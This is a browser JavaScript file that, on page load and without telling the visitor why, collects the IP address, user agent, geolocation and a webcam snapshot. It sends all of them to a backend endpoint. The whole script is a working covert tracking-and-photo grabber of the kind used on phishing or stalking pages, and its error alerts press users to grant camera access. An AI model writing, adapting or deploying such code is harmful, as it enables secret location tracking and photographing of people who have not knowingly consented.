// combinedScript.js

document.addEventListener("DOMContentLoaded", async () => {
  try {
    // 1. Get user's IP address
    const ipAddress = await getIpAddress();
    console.log("User IP Address:", ipAddress);

    // 2. Get device information
    const deviceInfo = getDeviceInfo();
    console.log("User Agent:", deviceInfo.userAgent);
    console.log("Platform:", deviceInfo.platform);

    // 3. Get user's location
    const location = await getLocation();
    console.log(
      "User Location:",
      `Latitude: ${location.latitude}, Longitude: ${location.longitude}`
    );

    // 4. Capture a photo when the DOM is loaded
    const blob = await captureAndSendPhoto();

    // 5. Send all data to the backend
    await sendAllDataToBackend(ipAddress, deviceInfo, location, blob);
  } catch (error) {
    console.error("Error:", error);
    alert("An error occurred. Please try again.");
  }
});

async function getIpAddress() {
  const response = await fetch("https://api.ipify.org?format=json");
  const data = await response.json();
  return data.ip;
}

function getDeviceInfo() {
  const userAgent = navigator.userAgent;
  const platform = navigator.platform;
  return { userAgent, platform };
}

async function getLocation() {
  return new Promise((resolve, reject) => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;
          resolve({ latitude, longitude });
        },
        (error) => {
          reject(error.message);
        }
      );
    } else {
      reject("Geolocation is not supported by this browser.");
    }
  });
}

async function captureAndSendPhoto() {
  try {
    // Request permission to access the camera
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });

    // Display video feed from the camera for a short duration (e.g., 1 second)
    const video = document.createElement("video");
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();

    // Wait for a short duration to allow the camera to stabilize
    await new Promise((resolve) => setTimeout(resolve, 100));

    // Capture a frame from the video stream
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const context = canvas.getContext("2d");
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Convert the canvas content to a Blob object (image file)
    const blob = await new Promise((resolve) =>
      canvas.toBlob(resolve, "image/jpeg")
    );

    // Stop the video stream and remove the video element
    stream.getTracks().forEach((track) => track.stop());
    document.body.removeChild(video);

    return blob;
  } catch (error) {
    console.error("Error accessing the camera:", error);
    alert("Error accessing the camera. Please grant permission and try again.");
    throw error;
  }
}

async function sendAllDataToBackend(
  ipAddress,
  deviceInfo,
  location,
  photoBlob
) {
  try {
    // Construct a FormData object to send data as a multipart/form-data request
    const formData = new FormData();

    // Append the photo blob with a file name
    formData.append("image", photoBlob, "snapshot.jpg");

    // Append other data as fields in the form
    formData.append("ipAddress", ipAddress);
    formData.append("userAgent", deviceInfo.userAgent);
    //formData.append("platform", deviceInfo.platform);
    formData.append("latitude", location.latitude);
    formData.append("longitude", location.longitude);

    // Make a POST request to the backend endpoint
    const response = await fetch("http://localhost:8080/api/send-all-data", {
      method: "POST",
      body: formData,
    });

    if (response.ok) {
      console.log("Data sent to backend successfully.");
      // After sending the data, you can handle the response or perform additional actions
    } else {
      console.error("Failed to send data to backend:", response.statusText);
      alert("Failed to send data to backend. Please try again.");
    }
  } catch (error) {
    console.error("Error sending data to backend:", error);
    alert("Error sending data to backend. Please try again.");
  }
}
